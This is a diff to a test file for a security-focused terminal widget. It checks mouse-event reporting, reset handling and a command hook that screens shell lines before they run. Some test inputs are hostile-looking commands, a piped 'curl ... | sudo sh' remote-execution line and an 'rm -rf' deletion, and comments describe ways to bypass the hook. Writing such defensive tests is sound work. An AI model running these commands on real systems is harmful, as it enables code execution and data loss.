@@ -457,11 +457,15 @@ _alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButto
                           Qt.KeyboardModifier.ShiftModifier))
 eq(_asent, [], 'Shift+press is local text selection (no report)')
 
-# _event_cell clamps: a point past the right edge clamps to the column count; the
-# top-left corner clamps to 1;1 (never a cell off the grid)
+# _event_cell clamps: a point past the right/bottom edge clamps to the column/row
+# count (a click in the sub-row strip below the last row must not name a row past the
+# grid); the top-left corner clamps to 1;1 (never a cell off the grid).
+_alt._rows = 24                          # winsize height the child knows its screen as
 _asent.clear()
 _alt.wheelEvent(_wheel_ev(-120, pos=(100000, 100000)))
-ok(_parse_sgr(_asent)[1] == 80, 'a point past the right edge clamps col to the grid width')
+_edge = _parse_sgr(_asent)
+ok(_edge[1] == 80, 'a point past the right edge clamps col to the grid width')
+ok(_edge[2] == 24, 'a point past the bottom edge clamps row to the grid height')
 _asent.clear()
 _alt._wheel_accum = 0
 _alt.wheelEvent(_wheel_ev(-120, pos=(-1000, -1000)))
@@ -480,6 +484,42 @@ _alt.mouseDoubleClickEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.Lef
 ok(_parse_sgr(_asent) is not None and _parse_sgr(_asent)[3] == 'M',
    'a double-click is reported as a press when the child grabs the mouse')
 _alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))
+
+# CHORD: left+right pressed together each report a press; releasing EACH must report
+# its OWN button. Tracking a single button lost the first release, leaving it stuck
+# in the child (no protocol release). codex ai-review.
+_asent.clear()
+_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
+_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.RightButton,
+                          buttons=Qt.MouseButton.LeftButton | Qt.MouseButton.RightButton))
+_asent.clear()
+_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.RightButton,
+                            buttons=Qt.MouseButton.LeftButton))
+_chord_r = _parse_sgr(_asent)
+_asent.clear()
+_alt.mouseReleaseEvent(_mev(QEvent.Type.MouseButtonRelease, Qt.MouseButton.LeftButton))
+_chord_l = _parse_sgr(_asent)
+ok(_chord_r is not None and _chord_r[0] == 2 and _chord_r[3] == 'm',
+   'chord: releasing right reports a right release (code 2, m)')
+ok(_chord_l is not None and _chord_l[0] == 0 and _chord_l[3] == 'm',
+   'chord: releasing left ALSO reports (code 0, m) -- the button is not left stuck')
+
+# INPUT SUSPENDED during a paste/copy review: with mouse tracking on and the review
+# bar up, a NEW click / wheel / focus must NOT write to the child (keyPressEvent
+# already refuses keys), nor track a button (which would unbalance a later release).
+# grok ai-review.
+_alt._review_active = True
+_asent.clear()
+_alt.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton))
+_alt._wheel_accum = 0
+_alt.wheelEvent(_wheel_ev(-120, pos=(200, 100)))
+_alt.focusInEvent(_QFEv(QEvent.Type.FocusIn))
+eq(_asent, [],
+   'input suspended during review: no mouse / wheel / focus report reaches the child')
+ok(not _alt._mouse_report_btns,
+   'no button is tracked during review (so no unmatched release fires later)')
+_alt._review_active = False
+_alt._mouse_selecting = False
 
 # the child resets the modes (well-behaved exit): reporting stops, mouse tracking
 # off, and the alt-screen wheel falls back to the arrow surrogate
@@ -516,7 +556,26 @@ ok(1000 in _msplit._mouse_modes,
 feed_output(_msplit, b'\x1b[?' + b'1' * 4301 + b'h')
 ok(0 not in _msplit._mouse_modes and isinstance(_msplit._mouse_modes, set),
    'an over-long DECSET parameter is ignored, not a ValueError crash')
+# RIS (ESC c) and DECSTR (ESC [ ! p) are FULL resets that clear tracked mouse modes,
+# so `reset` (or a program's soft reset) disables tracking that untrusted output
+# turned on -- the usual recovery. Folded in ORDER: a reset then a re-enable leaves
+# only the re-enabled modes. grok ai-review.
+from secure_terminal.sanitize import scan_mouse_modes           # noqa: E402
+eq(scan_mouse_modes('\x1bc', {1000, 1006}), set(),
+   'scan_mouse_modes: RIS (ESC c) clears all tracked mouse modes')
+eq(scan_mouse_modes('\x1b[!p', {1000, 1006}), set(),
+   'scan_mouse_modes: DECSTR (ESC [ ! p) clears all tracked mouse modes')
+eq(scan_mouse_modes('\x1b[?1000h\x1bc\x1b[?1006h', set()), {1006},
+   'scan_mouse_modes: a reset then a re-enable leaves only the re-enabled mode')
 _msplit.close()
+# end to end through the widget (a fresh tab, so no earlier modes linger): feeding
+# RIS clears the tracked modes (the reset-recovery path).
+_mris = SecureTerminal(command='/bin/cat', tui=True)
+feed_output(_mris, b'\x1b[?1000;1006h')
+ok(_mris._mouse_modes == {1000, 1006}, 'widget tracks a combined DECSET')
+feed_output(_mris, b'\x1bc')
+ok(not _mris._mouse_modes, 'feeding RIS through the widget clears the mouse modes')
+_mris.close()
 
 # EOF flush: a program's FINAL output that ends mid-escape must NOT vanish. In CLI
 # mode feed_chunk_carry holds a trailing possibly-incomplete escape in _esc_carry;
@@ -2232,6 +2291,11 @@ hk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
 _hsent = spy_writes(hk)
 _hnotes = []
 hk.hook_notice.connect(_hnotes.append)
+# The hook judges SHELL command lines, which exist only at a bare prompt. The
+# /bin/cat child is an echo-safe stand-in for the shell, so simulate the bare
+# prompt (no foreground program) the hook actually fires in; a real login-shell
+# tab has _command is None and reads has_foreground_program() False at its prompt.
+hk.has_foreground_program = lambda: False
 
 
 def _htype(term, text):
@@ -2244,11 +2308,39 @@ key(hk, Qt.Key.Key_Return)
 ok(b'\r' in _hsent, 'hook allows a safe command (Enter submits)')
 _hsent.clear()
 hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
-_htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
+_cmd_blocked = 'curl http://malware.invalid | sudo sh'   # harmless illustration
+_htype(hk, _cmd_blocked)
 key(hk, Qt.Key.Key_Return)
-ok(b'\r' not in _hsent and b'\x15' in _hsent,
-   'hook blocks: not submitted, typed line discarded (Ctrl+U)')
+# The line's content is mirrored (nothing recalled/edited), so it is erased
+# deterministically: one Backspace per character, NOT SIGINT. SIGINT (\x03) would
+# both need to remain the tty intr char (stty intr undef disarms it, retaining the
+# line for the next Enter -- a hook bypass) and flush the input queue (tcflush),
+# swallowing a suggestion written right after.
+ok(b'\r' not in _hsent and b'\x03' not in _hsent
+   and (b'\x7f' * len(_cmd_blocked)) in _hsent,
+   'hook blocks: not submitted, typed line erased char-for-char (no SIGINT)')
+ok(not hk._line_dirty and hk._line_buffer == '',
+   'a mirrored block leaves the buffer truthfully empty (no bypass on next Enter)')
 ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
+# Finding: with a FOREGROUND PROGRAM the keystrokes are ITS input (a sudo/ssh
+# password, cat's stdin), not a shell command -- the hook must NOT fire, or the
+# secret is handed to the external hook process and rendered in its dialog.
+hk.has_foreground_program = lambda: True
+_hsent.clear()
+_leaked = []
+hk._hook_ask = lambda _c, _r: (_leaked.append(_c) or 'discard')
+_htype(hk, 'hunter2')                             # a password at e.g. sudo's prompt
+key(hk, Qt.Key.Key_Return)
+ok(not _leaked and b'\r' in _hsent,
+   'a foreground program owns the line: hook skipped, keystrokes pass through')
+_hsent.clear()
+_leaked.clear()
+_htype(hk, 'hunter2')
+key(hk, Qt.Key.Key_J, mods=Qt.KeyboardModifier.ControlModifier)   # Ctrl+J accept-line
+ok(not _leaked, 'Ctrl+J accept-line under a foreground program also skips the hook')
+hk.has_foreground_program = lambda: False         # back to a bare prompt
+hk._line_buffer = ''
+hk._line_dirty = False
 # history recall desyncs the hook's view of the line, so it must FAIL SAFE (ask),
 # not judge a stale/empty buffer and wave a recalled command through.
 _hsent.clear()
@@ -2257,9 +2349,22 @@ hk._hook_ask = lambda _c, _r: (_asked.append(_r['message']) or 'discard')
 key(hk, Qt.Key.Key_Up)                 # recall from history -> buffer now stale
 ok(hk._line_dirty, 'a history/edit key marks the line unverifiable for the hook')
 key(hk, Qt.Key.Key_Return)
-ok(_asked and b'\x15' in _hsent and b'\r' not in _hsent,
-   'edited line: hook asks and (on decline) discards, never submits unjudged')
-ok(not hk._line_dirty, 'dirty flag cleared after the decision')
+# The content is UNKNOWN (recalled), so it cannot be counted-erased; SIGINT is the
+# only keymap-free cancel. It is best-effort (stty intr undef disarms it), so the
+# dirty flag STAYS set: a second Enter re-asks rather than submitting a line the
+# cancel may have left at the prompt.
+ok(_asked and b'\x03' in _hsent and b'\r' not in _hsent,
+   'edited line: hook asks and (on decline) cancels, never submits unjudged')
+ok(hk._line_dirty,
+   'a discarded unknown line stays dirty: a disarmed SIGINT must re-ask, not submit')
+_hsent.clear()
+_asked.clear()
+key(hk, Qt.Key.Key_Return)             # press Enter again on the (possibly retained) line
+ok(_asked and b'\r' not in _hsent,
+   'second Enter after an unknown-line discard re-asks (no silent bypass)')
+hk._hook_ask = lambda _c, _r: 'run'    # now explicitly run it to settle the state
+key(hk, Qt.Key.Key_Return)
+ok(not hk._line_dirty, 'an explicit Run settles the line and clears the flag')
 # defense-in-depth: the hook layer single-lines a suggestion upstream, but the
 # widget also strips CR/LF at the write site, so even a suggestion that somehow
 # carried a newline can never auto-submit.
@@ -2299,6 +2404,20 @@ hk._line_buffer = 'x'
 key(hk, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U: full-line discard
 ok(not hk._line_dirty and hk._line_buffer == '',
    'Ctrl+U discards the line and stays clean (nothing stale to ask about)')
+# Ctrl+U's reach is cursor-dependent (bash unix-line-discard kills only cursor-to-
+# start), so it must NOT clear an ALREADY-dirty flag: Home (dirty) then Ctrl+U can
+# leave a survivor in the shell, but the old code reset the flag -> Enter submitted
+# it UNJUDGED. Fail-on-old canary for the command_hook bypass (reviewdrain15).
+_asked2 = []
+hk._hook_ask = lambda _c, _r: (_asked2.append(1) or 'discard')
+hk._line_buffer = 'rm -rf ~/important'
+hk._line_dirty = True                                # cursor moved (e.g. Home/Ctrl+A)
+key(hk, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U at a non-end cursor
+ok(hk._line_dirty,
+   'Ctrl+U after a cursor move STAYS dirty -- a survivor must still fail safe')
+key(hk, Qt.Key.Key_Return)
+ok(_asked2, 'Enter after dirty+Ctrl+U ASKS, never submits the unjudged survivor')
+hk._line_dirty = False
 
 # --- paste + hook: a paste can NEVER auto-execute. A SINGLE-line paste (with or
 # without a trailing newline) is delivered with its trailing submit stripped, so
@@ -2359,6 +2478,17 @@ _pmt = _QMimeHook()
 _pmt.setText('ls')
 _tuihk.insertFromMimeData(_pmt)
 ok(not _tuihk._line_dirty, 'a TUI-mode paste does not set the line-dirty flag')
+# TUI handler: Ctrl+U must PRESERVE an already-dirty flag too (its reach is cursor-
+# dependent), or a bare-prompt accept-line in TUI submits an unjudged survivor -- the
+# same command_hook bypass as the CLI path. Ctrl+C (SIGINT) still settles the line.
+_tuictrl = Qt.KeyboardModifier.ControlModifier
+_tuihk.has_foreground_program = lambda: False
+_tuihk._line_dirty = True
+key(_tuihk, Qt.Key.Key_U, mods=_tuictrl)             # Ctrl+U at a non-end cursor
+ok(_tuihk._line_dirty, 'TUI Ctrl+U after a cursor move STAYS dirty (no hook bypass)')
+_tuihk._line_dirty = True
+key(_tuihk, Qt.Key.Key_C, mods=_tuictrl)             # Ctrl+C discards the whole line
+ok(not _tuihk._line_dirty, 'TUI Ctrl+C (SIGINT) settles the line -- flag cleared')
 
 # --- paste WITHOUT a hook: _line_dirty has a SECOND consumer beyond the hook --
 # _line_pending(), the guard that stops _send_reexport from typing "export
@@ -4812,7 +4942,7 @@ _thk._hook_ask = lambda _c, _r: (_tui_asked.append(1) or 'discard')
 key(_thk, Qt.Key.Key_L, 'l')                            # type `ls` at the TUI prompt
 key(_thk, Qt.Key.Key_S, 's')
 key(_thk, Qt.Key.Key_Return)                            # accept-line
-ok(_tui_asked and b'\r' not in _thksent and b'\x15' in _thksent,
+ok(_tui_asked and b'\r' not in _thksent and b'\x03' in _thksent,
    'a bare TUI prompt routes accept-line through the hook (no silent bypass)')
 # an EMPTY bare prompt has nothing to judge -> the hook passes, Enter submits, no ask
 _thksent.clear(); _tui_asked.clear()
@@ -6166,6 +6296,7 @@ hk2 = SecureTerminal(command='/bin/cat')
 hk2.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
                 'transcript': 'none'})
 _h2 = spy_writes(hk2)
+hk2.has_foreground_program = lambda: False        # judge only at a bare prompt
 # an empty line is not intercepted -> normal submit
 hk2._line_buffer = ''
 hk2._line_dirty = False
@@ -6188,8 +6319,11 @@ _h2.clear()
 hk2._hook_ask = lambda _c, _r: 'suggest'
 _htype(hk2, 'x sudo sh')
 key(hk2, Qt.Key.Key_Return)
-ok(b'ls' in b''.join(_h2) and b'\x15' in _h2,
-   'hook: choosing the suggestion discards the line and inserts it')
+# The mirrored line is counted-erased then the suggestion is written -- NO SIGINT,
+# whose tcflush would swallow the suggestion bytes written immediately after it.
+ok(b'ls' in b''.join(_h2) and (b'\x7f' * len('x sudo sh')) in _h2
+   and b'\x03' not in _h2,
+   'hook: the suggestion erases the line char-for-char and inserts itself (no flush)')
 
 # --- paste: an all-control paste sanitizes to nothing; bracketed paste in TUI --
 _pt = SecureTerminal(command='/bin/cat')
